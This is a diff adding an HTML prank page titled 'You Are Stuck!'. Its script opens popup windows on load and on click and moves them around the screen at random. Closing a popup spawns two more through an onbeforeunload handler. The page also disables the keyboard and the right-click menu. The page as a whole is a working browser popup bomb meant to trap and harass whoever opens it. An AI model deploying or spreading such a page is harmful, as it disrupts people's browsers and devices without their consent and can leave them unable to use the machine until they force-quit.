@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>😂 You Are Stuck!</title>
+    <script>
+        let popups = [];
+
+        function spawnPopup() {
+            let w = window.open("", "", `width=300,height=200,left=${Math.random()*screen.width},top=${Math.random()*screen.height}`);
+            if (w) {
+                w.document.write("<h1>You Can't Escape! 😈</h1>");
+                w.document.write("<script>window.onbeforeunload = function() { opener.spawnPopup(); opener.spawnPopup(); };<\/script>");
+                movePopup(w);
+                popups.push(w);
+            }
+        }
+
+        function movePopup(win) {
+            let x = Math.random() * screen.width;
+            let y = Math.random() * screen.height;
+            setInterval(() => {
+                if (!win.closed) {
+                    x += (Math.random() * 50 - 25);
+                    y += (Math.random() * 50 - 25);
+                    win.moveTo(x, y);
+                }
+            }, 200);
+        }
+
+        function startMadness() {
+            for (let i = 0; i < 3; i++) spawnPopup();
+        }
+
+        // Disable keyboard and right-click
+        document.onkeydown = function () { return false; };
+        document.oncontextmenu = function () { return false; };
+
+        // Start on load
+        window.onload = startMadness;
+    </script>
+</head>
+<body>
+    <h1>Click anywhere to start...</h1>
+    <script>
+        document.body.onclick = startMadness;
+    </script>
+</body>
+</html>
